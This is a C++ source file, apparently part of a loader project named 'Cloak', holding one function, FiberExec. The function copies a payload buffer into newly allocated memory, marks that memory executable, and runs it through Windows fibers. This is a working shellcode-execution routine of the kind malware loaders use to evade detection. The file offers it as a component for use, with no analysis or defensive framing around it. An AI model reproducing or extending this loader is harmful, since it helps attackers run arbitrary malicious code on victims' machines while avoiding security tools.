#include "Cloak.hpp"

#ifdef FIBERS
BOOL FiberExec(IN PBYTE pbPayload[], IN SIZE_T sPayloadSize) {
    PVOID pPayloadAddress   = NULL;
    PVOID pPayloadFiber     = NULL;
    PVOID pMainFiber        = NULL;
    DWORD dwOldProtect      = NULL;
    
    pMainFiber = ConvertThreadToFiber( NULL );
    if ( ! pMainFiber ) {
        #ifdef DEBUG
        printf( "[-] ConvertThreadToFiber Failed with Error -> %d\n", GetLastError() );
        #endif // !DEBUG
        
        return FALSE;
    }

    pPayloadAddress = VirtualAlloc( 0, sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );
    if ( pPayloadAddress == NULL ) {
        #ifdef DEBUG
        printf( "[-] VirtualAlloc Failed with Error -> %d\n", GetLastError() );
        #endif // !DEBUG

        DeleteFiber(pMainFiber);
        ConvertFiberToThread();
        
        return FALSE;
    }

    memcpy(pPayloadAddress, pbPayload, sPayloadSize);

    if ( ! VirtualProtect( pPayloadAddress, sPayloadSize, PAGE_EXECUTE_READ, &dwOldProtect ) ) {
        #ifdef DEBUG
        printf( "[-] VirtualProtect Failed with Error -> %d\n", GetLastError() );
        #endif // !DEBUG
        
        return FALSE;
    }

    pPayloadFiber = CreateFiber(NULL, ( LPFIBER_START_ROUTINE ) pPayloadAddress, NULL );
    if ( ! pPayloadFiber ) {
        #ifdef DEBUG
        printf( "[-] CreateFiber Failed with Error -> %d\n", GetLastError() );
        #endif // !DEBUG
        
        DeleteFiber(pMainFiber);
        ConvertFiberToThread();

        return FALSE;
    }

    SwitchToFiber(pPayloadFiber);

    return TRUE;
}
#endif